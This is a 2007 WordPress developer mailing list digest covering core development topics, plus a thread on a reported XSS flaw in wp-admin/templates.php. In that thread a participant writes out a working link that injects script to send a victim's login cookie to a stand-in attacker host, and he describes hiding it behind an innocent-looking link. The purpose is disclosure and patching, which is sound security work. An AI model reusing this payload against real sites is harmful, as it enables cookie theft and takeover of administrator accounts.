    Mmm, following up on myself again.  But I figured I should 
document the "fix" here, as well as on meyerweb.

    So in the end, thanks to an oldish post from Alex King, I found a 
solution to WordPress' aggressive 404ing and thus solved both of the 
above problems:  I commented out lines 35-135 of classes.php.  Now my 
feeds don't return files with 404 headers, and the main page of my 
archive actually displays the intended content instead of a WP 404. 
Furthermore, any legitimate 404s with my WP directory trigger a serve 
of the Apache-defined 404 page, not WP's.
    Since WP is meant to be used by a wide range of folks, someone 
might want to look into providing a convenient hook or option or 
something to switch off WP's 404 handling, or whatever it was I did 
by commenting out 100 lines of a core file just to get my site 
working again.

Yes, especially since modifying core code is a really bad idea.

Ah... I bet you're right. That's got to be it. Just got a few more  
without despam links, and they are indeed nearly impossible to  
distinguish from regular comments. Thanks.

    I'm assuming the "yes" is in response to my suggestion that a hook 
or option be created.  I would certainly love to see that happen, 
because believe me, I'm not at all happy about modifying a core file. 
It will clearly make future upgrading a much bigger pain in the neck, 
which will make me less likely to do it, which is bad.  I'll also 
have to check my .htaccess file every time I upgrade to make sure WP 
didn't add its mod_rewrite.c stuff again, since I had to comment that 
out as well.  Bleah.
    I think that having a simple way to bypass WP's code in this area 
(both rewriting and 404-type error handling) would be good enough for 
cases like mine.  That way WP users who who already have those set up 
on an older site with a less capable CMS and are interested in 
upgrading to WP, or just generally want to rely on their web server 
for HTTP error pages and would rather set up their own rewrites, can 
do so without worrying about their in-place systems fighting with 
WP's internals.

I will renew my proposal for a GET variable to be set. If that is  
set, then WP falls back on "non fancy permalink" handling and looks  
at the GET variables directly. This allows custom rewrite rules to  
work as the person intended without having to figure out all of the  
places in the Query object that need to be set/overridden/etc.

Tip for Eric, change the permissions of your .htaccess file so that  
WP can't write to it.

Cheers,
--Alex

Subject: [wp-hackers] Broken Pingbacks (due to custom URLs?)
Message-ID: <172844E0-4DD1-4E19-9056-78C40BF12AF2@alexking.org>

One of the things I did on my site when I combined 2 WordPress  
installs into a single database was add some artificial URL elements  
(based on categories) to maintain the illusion of 2 different blogs  
but get the benefits of having everything in a single database.

For example:

http://alexking.org/blog/2007/01/01/example

and:

http://alexking.org/sports/golf/2007/01/01/example

I got everything working as I wanted to using the parse_query and  
permalink hooks, however pingbacks are broken on all of these pages.  
I've done some testing and attempted to strip out the extra URL  
elements in the XMLRPC before the ping code kicks in, but I've been  
unsuccessful.

Is there anyone out there that knows the pingback code well that  
might be willing to help me out? I believe the main things I need to  
do are:

1. Make sure WP knows what post is receiving the ping
2. Make sure that the validation check (seeing that a link is indeed  
on the linking page) is happy when it sees the URL with the  
additional URL elements in it.

I'll be happy to meet folks in IRC or on IM if e-mail isn't a  
suitable medium for help you're willing to provide.

Additionally, does anyone have a 'pingback sender' test script for  
use in testing like this?

Any help is appreciated, thanks.

Cheers,

Subject: [wp-hackers] Validating Atom 1.0 feed
Message-ID: <45C232FF.3080502@unFocus.com>

Hello,

I made this Atom Feed (attached), and thought I'd share it back to the 
community. It could use a bit of cleanup, and is generally not optimal 
in places, but it does validate. I'd love to finish this up and 
integrate it with Word Press better, maybe even implement the Atom API 
for updating (if I understand the API correctly).

I did a little searching the archives for mention of Atom, and it seemed 
the conclusion was that Atom in general is pretty DOA, is that still the 
prevailing view? Any other thoughts?

Thanks,

Kevin N.

Hi Kevin,

There was no attachment, but if I understand you properly, you are
likely duplicating functionality that is either already implemented or
being worked on. Download WordPress trunk
http://wordpress.org/download/svn/

Thanks for participating!

Ah, I wondered if that might be the case :-) .

I'll check the work in svn out, but since it's done, here's what I've done:

and the validating feed:

Message-ID: <4e0fb41b0702011150x32108f72rd14b1c6011d78319@mail.gmail.com>

I'm using the following code to place specific categories in the main nav of
a site in conjunction with wp_list_pages:

<li class="<?php if (is_category('2')) { ?>current_page_item<?php } else {
?>page_item<?php } ?>"><a href="?cat=2"><?php global $wpdb; $cat_name =
$wpdb->get_var("SELECT cat_name from $wpdb->categories WHERE cat_ID = 2");
echo $cat_name; ?></a></li>

For some reason, when viewing a category with the same ID as a page in the
main nav, the page gets class="page_item current_page_item" applied to it.
Never had this problem in 2.0. Any ideas?

Hey,

I took a look at some of the stuff in the SVN, and it seems progress has 
definitely been made. :-) I did notice that some things were different 
from what I have done though, and I thought I'd ask about those 
differences and a few other things.

1. The post id (atom id element) are set using guid. That's how it was 
in Word Press 2.1, though that didn't seem to be working, which causes a 
validation error. I guess the question is, is the guid good enough, or 
should the id be more universally unique, using something like a tag 
uri? I made a function that converts a permalink, and a date to a tag 
uri. I guess a related question might be, how do you feel about tag 
uris? :-)

2. Has any work been done on the Atom API? I was thinking this might be 
useful for that:
http://www.dentedreality.com.au/webpad/ I may take a closer look to see 
how useful.

3. Does get_post_time return the date/time of the original post, or the 
last update? How do I get the other time?

4. Is there a way to get the date/time the whole blog was set up, to use 
in the feed's id element.

Thanks,

Kevin N.

Hi All,
I have proposed a community project in response to w3c semantic web SWEO
group's call for community project. The project will further develop web2x
plugin in order to make wordpress the best tool for semantic web data
publishing. Please see project description from this link "Open Data on
Semantic Web" on the community project wiki
page<http://esw.w3.org/topic/SweoIG/TaskForces/CommunityProjects>.
I'm recruiting team members (developer and community builder) now. Let me
know if this open source project sounds interesting to you.
Best,

Hey Brian, essentially,  the function wp_lists_pages is thinking that I'm
currently on ?page_id=4 (for example) while I'm actually viewing ?cat=4.
Therefore applying the active css class to both items ("current_page_item").
The main nav has 2 items that look as if they're selected.

Message-ID: <45C393C5.7050508@duechiacchiere.it>

Hi guys, I did not find any previous issue about this, so maybe it 
depends on my installation. I was just searching for an article inside 
my Management area. Submitted my search string and some replicated 
articles showed up. Even using the search field for public users (on my 
weblog homepage) gives the same result. Try searching "talebani" on 
www.duechiacchiere.it . Is there a bug or is just an update-related 
problem for my DB?

Thanks!

I heard that before in an enterprise software startup I was part of (it was
successful and is now part of GE in case you are interested). We hit the 2
billion mark way sooner than expected because id's were being allocated in
batches (similiar to ip address problem) and lots of unused id's were left
in the middle. Anyway the point I am trying to drive home is that
wordpress.com, rather than any individual blog, may reach the limit
reasonably soon. Also I don't know if id's are reused, I don't think it is.

My two cents...

WordPress 2.0.x can't handle much more than 800-1000 users because of
the way wp-admin/users.php loads them all onto the same page (you run
out of memory at this point).  2.1 fixes that and it can scale to at
least 10,000, but I honestly have no idea what the ceiling is now.  I
really don't think 2 billion is anything we need to worry about for now.

ID's aren't reused. They're AUTO_INCREMENT, which means that once an ID is
used, it skips ahead. That's why post ID's and etc jump all around if you
delete a post, etc.

If the 2 billion mark is really a problem, you may be able to switch some
stuff in the database around (column types). But 2 billion is about 1/3 of
the world's population... I don't think WP.com is even going to hit that
very soon. Keep in mind that # of blogs != # of users. A lot of users have
more than one blog attached to their username.

Is there any anti-spam mechanism on that front? I don't recall any...

Message-ID: <004301c748d9$ff99a170$f97ab481@rossweb>

Hi,

 

How does Wordpress.com do the "I would like my blog to be visible only to
users I choose  " privacy option.

This does not seem to be available with WPMU v1.0 and I'm having trouble
finding a plugin to make it so.

I've seen this:

http://patrick.bloggles.info/2006/09/16/setup-private-blog-on-wordpress-mu/

but it seems like more of a hack. I'd like a simple plugin so that we can
maintain an upgrade path without having to re-hack every time a new version
comes out.

 

Is it possible?

 

Cheers,

   RMWB.

First off, I don't know whether this is the appropriate channel for MU
problems. That aside, have you checked the SVN version out yet? The feature
might be in there, just not released yet.

1. The only WPMU list I have ever found is wpmu-trac and that doesn't seem
to be open for discussion unless I post this as a bug, so I figured that
here is as good a place as any as it is frequented by the core developers
and WPMU is just a subset of WP.

2. Not from the look of this:
http://trac.mu.wordpress.org/browser/trunk/wp-admin/options-privacy.php?rev=
880

Presumably there must be significant differences between what Automattic use
for wordpress.com and what is actually kept in SVN and released as WPMU.

Please correct me if I am wrong, and point me to the right plugin.

P.S. Cheers to WP-Hacker Scot Hacker for pointing me to this:
http://dev.wp-plugins.org/browser/registered-only/ and I am now using that
plugin so that only registered users can view certain politically sensitive
blogs, but all registered users can view that blog and now that we have our
CAS/LDAP authentication plugin working that is over 20,000 users and I'd
really like the fine grained user access control that is available on
wordpress.com

Lester, I know this is a bit late, so disregard this if you've already 
found the solution

it would be a good idea to do a print_r(wp_next_scheduled('test')); just 
to make sure that it hasn't gotten itself scheduled when you were 
testing something earlier, also try renaming your hook and your function 
to something else, just in calse there is a name colision.  There would 
be no error reported if there was, it would just do nothing.

I've got a *fairly* extensive post on how to schedule events in 2.1 
here: 
http://blog.slaven.net.au/archives/2007/02/01/timing-is-everything-scheduling-in-wordpress/ 
. You seem to know what you're doing anyway, but there may be something 
in there that's a help.

Hi Guys,

Need some help with a sql that is being generated after a plugin adds a 
join and a where clause. On some systems, the sql below is somehow 
causing WordPress to list double or triple (duplicate) posts but it 
works perfectly on most systems. I'm stumped, can somebody give any 
clues as to why this is happening?

|SELECT SQL_CALC_FOUND_ROWS wp_posts.* FROM wp_posts LEFT JOIN 
wp_postmeta AS _plug_join ON wp_posts.ID = _plug_join.post_id AND 
_plug_join.meta_key = '_plug_access' WHERE 1=1 AND (post_type = 'post' 
AND (post_status = 'publish')) AND _plug_join.meta_value != 'P' ORDER BY 
post_date DESC LIMIT 0, 10|


Thanks,
Mike

The same happended to me with WordPress 2.1.

You might use the filter hook 'posts_distinct' and return 'DISTINCT', without 
quotes, from the callback function.

That fixed it. Didn't know that hook exists, thanks a lot.

I'm getting an error in my rss feed, originating from the database. Having
traced it through, I'm thinking that whatever problems the database has they
shouldn't be exposed to RSS - the do_feed routine should hide_errors during
its duration.
I'm using wpmu from svn 803.

In 2.0.x, uploads seemed to be attached to a specific post (post_parent 
was set to the post you were writing when you uploaded it).  Now in 2.1, 
it seems that they belong to nothing (post_parent is -1170977629).  Am I 
correct in stating that there is no way to tell what post they are 
supposed to go with?

Well it turned out that it was a plugin hooked into the RSS event - not the
core's fault that the plugin didn't set hide_errors.

Maybe there would be a means for this flag to be set automatically?

I installed wpmu from svn at around the time 1.0 came out. I'm told 1.1 is
not out yet.

I'd like to ask 3 questions having not found the answers elsewhere.  
Hopefully this is still the best place to find such advice.

1: Nonces

I have been attempting to set up nonces on a plugins admin forms as  
encouraged at 'Mark on WordPress'. Whatever I try however, I always  
get a 'header already sent' (started in menu_header.php:20 in  
functions.php line 1219). Which is wp_die(). This is followed by the  
'Are you sure' message and clicking yes takes me to the "Manage  
Posts' page for some obscure reason. My own page is left as it was of  
course.

I have scoured my code and trimmed it to the minimum and there is  
absolutely no output prior to the check_admin_referer('nonce_key') call.

The question is, is the info at Marks site still current and correct  
or has something changed in 2.1 that I am unaware of? I wanted to  
secure this stuff as much as I could but so far am just failing!

2: Siteurl

If a user has set up WP as 'www.example.com/wordpress' but has  
redirected to the root so that  '/wordpress' does not form part of  
the url, the option setting 'siteurl' includes the /wordpress folder.  
If I want to get at the actual url the site uses is it 'wpurl' or  
'home'? I think its 'home' but I'm not sure. Sadly, I can't set up a  
quick test at the moment and need to know quickly!

3: TinyMCE

Something I asked a couple of weeks back but I think the post got  
lost! Does anyone know if there is a documented way of including the  
WP TinyMCE implementation in a plugin to save re-supplying it as a  
part of the plugin? Sorry - I've looked at the code but just get lost...

If this is the wrong place to ask these questions please let me know.  
They didn't seem appropriate for the support forum.

regards and thanks
Andy

Thanks Robin. It's what I thought but nice to have confirmation. It  
seems to be one that doesn't get a mention in the codex - at least as  
far as i could see.

As administrator, I'm concerned some of those errors might be symptomatic of
a deep problem.

Has anyone considered logging these hidden messages?

Thanks,I think I need to do so, as something is amiss on my server, so
what's the best logging mechanism to use? syslog? log to database? Is there
a particular php / wordpress error logging class to use?

Thanks,
       Martin

It only does the negative post_parent when you're attaching things to a 
post that hasn't been saved yet. After it's published, or saved as a 
draft, it should update the post_parent ID to point to the correct place 
in the database.

That's strange as it does that to attachments for posts already made in WPMu.

We haven't had a good rousing discussion for awhile, so lets argue about tags.

http://trac.wordpress.org/ticket/3723

Chime in if you have opinions on database schema and overall design.
I've attached a couple of different patches to that ticket.  One
introduces a new tags table and the other reuses the categories table.
 If you care about categories and tags, cast your opinions on this
thread and submit your patches and design ideas to trac.

Subject: [wp-hackers] WordPress Calendar
Message-ID: <GOELKFPEDEHFKGMAHMJBOEJEIAAA.d.l.wilson@gmail.com>

Hi all

I'm new to the list, but was told this is a good place to start.

I am trying to implement a full-page calendar into my WP site. I want it to
contain events I add (past, current, future), but I do not want it to show
any posting activity.

http://www.fahlstad.se/wp-plugins/wp-cal/ is one I like the looks of. This
one (though not a WP site) http://www.826valencia.org/events/2007_02 has a
nice look too, though I really like the former with the current day's items
listed to one side.

However, when I tried to install the former, I ran into a problem. I created
a page, as it said to, and entered the call for the calendar. Saved the
page, and was presented with a blank page. I entered the call both by just
typing it in, and by hitting the "html" button in the editor and putting in
there as well. And yes, the plug-in was installed and activated.

It showed up in my options page, and I could edit it, but since you add
events through the actual page as it shows on the site, I couldn't add to it
if I wanted to.

I am using WP 2.0.7.

Any ideas? It's all located here - http://tragicbeautiful.com/ .

(16:25:08) *MartinCleaver:* I think my install is experiencing problems that
are muted by hide_errors
(16:25:21) *MartinCleaver:* I think that logging during errors would allow
me to diagnose
(16:25:38) *MartinCleaver:* I want the best approach for logging these
errors
(16:25:59) *MartinCleaver:* This would go into function print_error($str =
'')
(16:26:49) *MartinCleaver:* (in wp-db.php_
(16:26:51) *MartinCleaver:* )
(16:26:57) *MartinCleaver:* should I log to syslog? what class should I use?
Is there a reason why there is not currently logging in there?
(16:28:34) *zamoose:* Martin: what sorts of errors are you seeing?
(16:28:45) *zamoose:* or, rather, what are you expecting to see?
(16:29:22) *MartinCleaver:* well, I was getting errors (from shortstat)
appear in my RSS feed, but I had to suppress them there as they were
breaking the feed.
(16:30:00) *MartinCleaver:* So I know errors get generated at line 109:
(16:30:01) *MartinCleaver:* if ( $this->show_errors ) {
(16:30:01) *MartinCleaver:* // If there is an error then take note of it
(16:30:01) *MartinCleaver:* print "<div id='error'>
(16:30:01) *MartinCleaver:* <p class='wpdberror'><strong>WordPress database
error:</strong> [$str]<br />
(16:30:01) *MartinCleaver:* <code>$query</code></p>
(16:30:01) *MartinCleaver:* </div>";
(16:30:01) *MartinCleaver:* } else {
(16:30:01) *MartinCleaver:* return false;
(16:30:01) *MartinCleaver:* }
(16:30:18) *MartinCleaver:* since I suppressed using hide_errors they don't
get logged
(16:31:18) *MartinCleaver:* So I'm wanting to create an admin function so
that anything that causes an error ( shown or hidden from the web user) gets
logged for later use by the admin
(16:32:06) *MartinCleaver:* In some ways I am shying away from writing to
the database, as in some scenarios the failure would be with the database.
(16:32:18) *MartinCleaver:* also, log size could get out of hand
(16:32:24) *zamoose:* true
(16:32:27) *MartinCleaver:* and they should be rotated etc.
(16:32:33) *zamoose:* what purpose would logging these errors erve?
(16:32:37) *zamoose:* errrr serve, even
(16:32:59) *MartinCleaver:* I'm thinking if there are errors, real errors,
then they should be dealt with
(16:33:31) *MartinCleaver:* I suspect, for instance, when I exported a
database from one server to another that I lost all my auto_increment flags
(16:33:49) *MartinCleaver:* but I don't see errors, just failures to perform
(16:34:04) *MartinCleaver:* logging critical errors just seems like the
first next sane step
(16:34:16) *zamoose:* hmmm
(16:34:39) *MartinCleaver:* I appreciate that not all errors will actually
be errors
(16:35:30) *zamoose:* is this only affecting you, or are others seeing the
same thing?
(16:35:40) *chye-fhut:* does WordPress have it's own error handling or rely
on whatever PHP provides?
(16:35:56) *zamoose:* depends on which version of WP
(16:36:10) *MartinCleaver:* well it was affecting others - my RSS feed was
broken
(16:36:13) *zamoose:* there's been a lot of error handling improvements that
have gone into 2.0 and 2.1
(16:36:25) *zamoose:* what web host are you using?
(16:36:28) *MartinCleaver:* I am on 2.0 based code
(16:36:36) *MartinCleaver:* using a powervps installation
(16:37:03) *MartinCleaver:* (my server actually runs wpmu, the multi-user
version, but this code line is identical)
(16:38:27) *zamoose:* okay, well, if you think that it's due to
auto_increment being incorrectly set, why not simply log in to your mysql
instance and run, say `desc wp_posts` in order to see if auto_increment is
listed in Extra?
(16:38:48) *MartinCleaver:* I think it affects every table
(16:39:00) *MartinCleaver:* and that does not protect against future errors
(16:39:10) *MartinCleaver:* I'm thinking I can syslog before this clause:
(16:39:26) *MartinCleaver:* // Is error output turned on or not..
(16:39:26) *MartinCleaver:* if ( $this->show_errors ) {
(16:39:37) *MartinCleaver:* that way errors would always be captured
(16:40:11) *zamoose:* true
(16:40:18) *zamoose:* just don't do it long-term
(16:40:27) *MartinCleaver:* like chye-fhut, I wonder which (php vs. wp)
facility to use
(16:40:35) *MartinCleaver:* sure, I could disable logging
(16:40:46) *MartinCleaver:* but there should be the option to turn it on
(16:41:47) *MartinCleaver:* I grepped the code for ' log' - but this
revealed nothing about a wp based logging system
(16:42:06) *MartinCleaver:* so I'm assuming (and I'd like confirming) that
wp does not have one
(16:43:33) *MartinCleaver:* and if noone knows, can someone suggest pros and
cons for a syslog php based one, and a library with which to log and a set
of tools with which to monitor and rotate the logs?

Keep categories as is. Add a new set of tables for tags without impacting
UTW.

Personally, I'm for leaving tags out of the core. Categories are a bare
necessity, IMO, but tags and tagging and tag clouds and etc are plugin
material.

Hey full-disclosure folks, i found several Wordpress flaws:

- Redirection Script in every Wordpress installation out there
- XSS in every wordpress.com blog (only accessible for the admin, but 
that's probably the main aim of the attacker)
http://mybeni.rootzilla.de/mybeNi/blog/3/
- directory traversal in the wp-backup plugin allows you to download 
etc/passwd file (i hope this hasnt been found before, I didnt check it)

If the user was sent to a URL to perform, say, a Delete action on a
post, they'd either have to confirm it with a "Yes / No" or there'd have
to be a 1-in-1000000 chance that the attacker guesses the right nonce.

This is old. http://security.nnov.ru/Ndocument899.html
Plus, the plugin is not included in WordPress 2.1 and later.

I think it was fixed in version 1.8 of wp-db-backup.

I've been thinking about breaking UTW into a core tagging plugin,  with
addon-plugins for the various bells, whistles, geegaws and magical pixies,
anyway;  so having core tagging as part of wordpress is no skin off my nose,
and perhaps something to be encouraged from my point of view.

Wikipedia runs HTML Tidy on all their pages, which guarantees all their
markup is well-formed.

Then just take out the hide errors line, and try again.

PHP also has a function called error_log which you could use in the code:

http://us3.php.net/error_log

I don't think this is really relevant to core development. We only use 
hide_errors in fairly safe places, and there are no known 
DB-error-causing bugs in any of our code.

In the future, it would be polite to the numerous people on this list to 
keep emails short and to the point, I'm not sure if having this entire 
conversation from IRC really adds anything to your earlier request that 
couldn't be said in a sentence or two.

We would only include the bare necessities in core leaving more
advanced things to UTW.  There is even a chance we might use the UTW
schema.  We'll see how the schema debate goes.  Tagging is a popular
add-on, as demonstrated by the uptake of UTW.  We'd include it in core
with the idea of providing a nice base for the tagging plugins to
build on top of.

Tags in core is the 2nd most popular idea

+1 for basic tagging in core.

Shiny blinky things should be left to plugins, but a simple framework
would be a nice feature for core.

I would love to see something like this in WP, as I'm a user of bbPress, 
using the UTW and bbPress together, it gives an error sigh. However, 
there is a-work-around though.. I'll be looking forward to this possibly 
in the 2.2 version ...right? If not, drat! :P

The schema in the ticket looks sorta close to what I have at the moment...
I've been pondering adding a count column,  but hadn't quite gotten around
to it (:  tag and raw_tag is a nice addition.

As for UTW-bits;  I had figured on making some kind of
tag-rendering-thinger;  some kind of tag-shunter/import-export thinger;  and
a tag recommendation-buttony-interface thinger.  Depending on if it's in the
core,  I'll make inevitably end up making a synonym thinger too.  Which, I
think, about covers most of the interesting bits of UTW.

I like thingers.

I think this is a great idea: splitting the functionality of having a bare
tagging schema (and the UI to add them to a post) from all the options such
as display/clouds/bells&whistles and even import/export.  Lightens up UTW,
allows the separation of the display from implementation (just good Computer
Science), allows people to choose a cloud plug-in, or a list plug-in, or...
Seems like a great idea.

And yes, I think tagging is a core functionality.  As I've said before,
tagging is not a just tagging, think of it as an index, as keywords, as a
semantic element, not just a way to a cute tag cloud.  Keyword indexes are
an important part of any publishing system.

Amen! I totally agree with that.. It came packaged in bbPress, too bad 
they just didn't package it in WP from the get..

It cleans both HTML and XHTML, though neither massively well. I prefer
what I've seen of xmllint, myself. But what would either system do when
it encounters something it can't fix? And if fixes were applied
aggressively, could authorial intention be compromised?

Not quite. It is possible to confuse Tidy sufficiently that it generates 
malformed or no output.

Maybe we could use HTML Purifier?: http://hp.jpsband.org/comparison.html (it
could also replace kses)

Tagging in core: +1

The seperate implementation just copies the way categories work, which 
is okay. But the interface (even without plugins) should be different. 
More like del.icio.us & co. The plugin Simple Tagging 
(http://sw-guide.de/wordpress/wordpress-plugins/simple-tagging-plugin) 
is a great example of what i mean.

Thankyou. I wanted to see whether there was a recommended way. As that has
so many options I'll wrap PHP's error_log in a wp class.

I don't think this is really relevant to core development. We only use

Ok. Fair enough. I had thought such a feature might have been universally
appealing.

Sure. Thinking back I agree it was unwarranted. Please accept my apologies
for that.

Message-ID: <e6ec604d0702121012v54ea1497te54d4b8d3165fcea@mail.gmail.com>

Per Soderlind brought this up in another thread. I scanned the
Comparisons page and I think it sells itself very well:

http://hp.jpsband.org/comparison.html

I would love to replace KSES.

The primary downside I see to this is the size/number of files. KSES
is small and effective as a security filter, while HTML Purifier is
bigger and can do a whole lot more.

One possible benefit, something we accomplished on wordpress.com with
a customized csstidy library, would be the ability to sanitize inline
CSS.

Does anyone have experience with integrating or profiling HTML Purifier? Per?

Maybe it can give you a preview of the fixes it will do. Like after you 
post, or when you're moderating comments. It shows you the fixes and you 
can select which fixes to put in place.

Hi, this is the author of HTML Purifier. I'm glad to hear you discussing
HTML Purifier as a possible alternative.

> bigger and can do a whole lot more.

Yes, HTML Purifier is guilty of the large number of files, but kses is
by no means "effective", see
<http://hp.jpsband.org/comparison.html#kses> for the problems I found in
it.

Would offering a "single huge monster file" help out in any way?

> One possible benefit, something we accomplished on wordpress.com with

HTML Purifier actually already rolls its own CSS parser and validator,
so it's not necessary.

> Does anyone have experience with integrating or profiling HTML Purifier?
> Per?

I actually hacked up a little plugin for WordPress, I'm not so sure how
well it works (I don't use WordPress for a blog, although I have it
installed on my own machine), but it seems to be functional. Comments on
it would be appreciated:

<?php
/*

HTMLPurifier.  Standards-compliant output, guaranteed!

// include the library file
set_include_path(
    // change this to the path to your installation of HTML Purifier
    '/Documents and Settings/Edward/My Documents/My
Webs/htmlpurifier/library'
    . PATH_SEPARATOR . get_include_path()
);
require_once 'HTMLPurifier.php';

function wordpress_htmlpurifier($text) {
    static $purifier = null;
    if ($purifier === null) $purifier = new HTMLPurifier();

    // ugly hack, since content_save_pre doesn't have strip-slashed content
    static $magic_quotes = null;
    if ($magic_quotes === null) $magic_quotes = get_magic_quotes_gpc();

    if ($magic_quotes) $text = stripslashes($text);

    // preserve magic comments
    $magic_comments = array('more', 'nextpage', 'noteaser');
    foreach ($magic_comments as $name) {
        $text = str_replace("<!--$name-->", "<br class=\"wp-$name\" />",
$text);
    }

    // do our stuff
    $text = $purifier->purify($text);

    foreach ($magic_comments as $name) {
        $text = str_replace("<br class=\"wp-$name\" />", "<!--$name-->",
$text);
    }
    if ($magic_quotes) $text = addslashes($text);

    // the original text is lost, I don't like that very much.

    return $text;
}

add_filter('content_save_pre', 'wordpress_htmlpurifier', 100);
// if you're outputting data from the post_content_filtered data,
// you might want to use this
// add_filter('content_filtered_save_pre', 'wordpress_htmlpurifier', 100);

// disable client-side filtering. As a general rule, client-side
// filtering shouldn't be trusted, so we won't make the attempt at all.
function wordpress_mce_allow_all() { return '*[*]'; }
add_filter('mce_valid_elements', 'wordpress_mce_allow_all');

// disable balanceTags, this is core HTML Purifier functionality
remove_filter('content_save_pre', 'balanceTags');

// disable auto-paragraphing, this can easily break advanced HTML

// disable kses filtering: HTML Purifier is a kses replacement!

remove_filter('content_filtered_save_pre', 'wp_filter_post_kses');

// We decided to keep some filters since they do things that
// HTML Purifier does and are fairly safe. But you may still want

We've been talking about this for use with an CSS editor on the

as a core feature, the database table should be modified so tags can
have a "nice name" and the proper "tag slug" (for permalinks use), as
we currently have in posts.

The UI should be rather simple, I'm for the delicious implementation,
suggest feature and existing tags list should be included as well,
plus a way to add complex tags as Flickr uses.

Regarding themes and plugins, the API should be really simple and the
schema could be something like this,

tag_id
tag_name
tag_slug
tag_count

With that simple, yet powerful structure you can build a decent API,
plus, we will need some hooks in the admin UI in order to allow
developers to add some extra features, and some options to configure
basic functionality of the feature.

(Cross-posting to the related ticket as well.)

This is WPMU-specific, AFAIK.  You could, however, replicate that  
functionality and turn it into a plugin (yes, you'd have to manually  
activate THAT plugin ;-) ).  In fact, someone may have already  
written that plugin... I remember seeing that several years ago,  
although I can't find it now.

Authorial intent is a popular fallacy. All we have to go on is the text. 
We can't read the author's mind.

If the author had made their markup intent clear neither Tidy nor 
TagSoup will change it. However if the author has not made their intent 
clear, then Tidy and TagSoup will guess, just as browsers will. 
Sometimes the authors may agree with the guesses that the purifiers and 
the browsers make. Sometimes they won't. But there are guesses in this 
case no matter who makes them.

That's the problem with trying to fix the results of a "tag-soup in"
system. Authors don't think in tag soup. Data entry should be validated
on input not on output.

Subject: [wp-hackers] Reputed XSS issue with WordPress (templates.php)
Message-ID: <1171378914.7132.14.camel@localhost>

Hello,

Today, SecurityFocus reports a Cross-Site Scripting vulnerability for
WordPress (http://www.securityfocus.com/bid/22534).

However, (at least in my opinion) this is not a real security issue,
because a user who wants to execute the URL given in the PoC exploit
code must be logged in and have at least the capability to edit files.
If the user is not logged in, he will be asked to do so; if he doesn't
have the capabilities to edit files, the script will abort immediately.
Please see wp-admin/templates.php, ll. 37-60, especially ll. 40-41.

So, it might be possible that a user can inject JS via the URL as
displayed in the PoC, but when he is able to do this, he would actually
be able to write the JS into one of the other WP files anyway (given
they are server-writable). The capability of editing files is usually a
privilege to administrators in WordPress.


Best regards,
Alex G?nsche

That's hardly a security problem... if someone has the ability to edit
files, they can do much more than that.

This is why I always take those security sites with a grain of salt.

This can be triggered by users without the edit files capability. You just
have to trick somebody with that capability to click that specially
crafted link, by mailing a link or posting it in a comment for instance.

Also don't forget that a lot of admins have the Remember Me switch toggled
(bad!), which invalidates the "you need to login" approach, because that
happens automatically behind the scenes.

Bas Bosman (Nazgul)

Maybe so, but doesn't this fall into the "social engineering" category?

With the same arguments, you could say that other managing actions which
are triggered by a GET request are vulnerable to XSS attacks.

We protect this with a nonce and an AYS.  There's nothing more we can do.

Yes, but that's why they're called cross-site scripting attacks. They can
be triggered from other sites.

Any managing action which allows custom JavaScript to be directly executed
from a request is a XSS vulnerability and should be fixed.

Subject: [wp-hackers] Is there a plugin-writers guide that discusses
 security and other recent changes?
Message-ID: <45D1FBBC.3090202@comcast.net>

With concepts like:
- the right way to do user access checks (preventing access to a 
particular plugin, or plugin's options, for example)
- when and how to use Nonces for admin panel security (for people like 
me with extensive custom plugin management pages, forms, etc...)
- how to best implement simple options (a few checkboxes) versus custom 
options (like my cg-amazon management interface, search, add, remove, etc.).

I need to update all my plugins, would like to make sure I'm hitting ALL 
the 2.0.x and 2.1.x enhancements to security (and any other 
functionality).  I've seen docs with some mention of what plugins need 
to do to support the newest WP releases (table name changes, global 
changes, etc.), but certainly not wide enough coverage of bringing 1.x 
plugins fully up to spec with say 2.1... ;)

Not to mention that I should change some of my plugins from storing 
on-disk to saving into the db options field (which will remove some 
headaches from install, I think...).

Thanks,

Very possibly they are. Managing actions should not be triggered by GET 
requests. Full stop.

I doubt we've seen the last or the worst of these attacks.

And WordPress should enable social engineering attacks why exactly?

Attackers don't play by the rules, or split hairs about what is and 
isn't a legitimate route of attack, or which piece of software or 
combination of different programs they attack.

If I can get you to click this link I have your WordPress login cookie,
giving me admin (if you're admin ofcourse) on your blog, without AYS
and/or nonce saving you:
<a
href="http://victim.com/blog/wp-admin/templates.php?action=update&file=<script>document.location.href%3d'http://evilhacker.com/grab.php%3fb='%2bescape(document.cookie);</script>&submit=Update+File+%C2%BB">Google</a>

I then code a grab.php which saves that info and redirects you to a safe
page (For example google if the user was thinking he clicked a google
link) and you wouldn't even know your cookies are mine.

We should htmlencode the file parameter from the querystring before it's
being used as raw output to the client again to fix this.

Regards,
Bas Bosman (Nazgul)

P.S. If you think nobody clicks that link, what about a safe looking link
to my site, where this code gets executed onload. Again most people
wouldn't notice. This attack is even worse, because I can take the
referrer and try some frequent Wordpress install locations on that server,
thus making this attack work on more people instead of one.

I didn't get XSS with the sample exploit link.  Once I clicked through
the AYS though,  I got another AYS and XSS.  We just need to
specialchars the output of wp_explain_nonce().

That's indeed the best fix for this issue, but I hope my other mail
proofed that this can be used for XSS. (That the original exploit code
didn't do much doesn't mean it can't be adapted)

Yes. I had to play with it but managed to trigger XSS.  I put a fix in
for 2.0, 2.1, and trunk for everyones review and testing.

There is nothing like that in regular WP, but it could be replicated 
using my-hacks.php (remember that?) or maybe an include in wp-config.php.

You can use the old my-hacks.php trick to bootstrap whatever you want.

It has never failed to filter malicious code but several times I have
wanted to accomplish more than malicious code filtering, e.g. friendly
attribute pattern whitelisting for trusted sites, and found KSES
lacking in flexibility.

Nothing beats KSES for size and speed at the one thing it does best; I
just wanted it to do more.

Kses is fairly resilient against XSS attacks, I'll give it that. It
doesn't understand the HTML spec though, so that always keeps it open to
attacks in the future.

In terms of standards-compliance, kses doesn't come even close.
Besides the bare minimum needed to prevent XSS, kses performs no
attribute validation (<col span="foobar"> is legal), no inline CSS
validation (WordPress does not allow inline CSS in its attribute set),
and no nesting validation (<td>asdf</td> is legal even outside of tables).

Kses won't check if tags are balanced: WordPress had to implement custom
code to overcome this problem. Kses does not properly escape quotes
outside of tags, so it's totally unusable for XML (WordPress strips tags
and then htmlentity-izes for that use).

I think these are all very compelling reasons to drop that ancient piece
of code.

It certainly shouldn't and needn't and attackers certainly don't.
Someone please explain to a na?v guy, why enabling the "Remeber me" 
function is bad habit.
The "me" part I'd believe means something, and that something shouldn't 
be "anyone".

If you're not remembered, then the window of time in which you can be 
engineered into doing something bad is reduced. There is less likelihood 
that an attack will succeed.

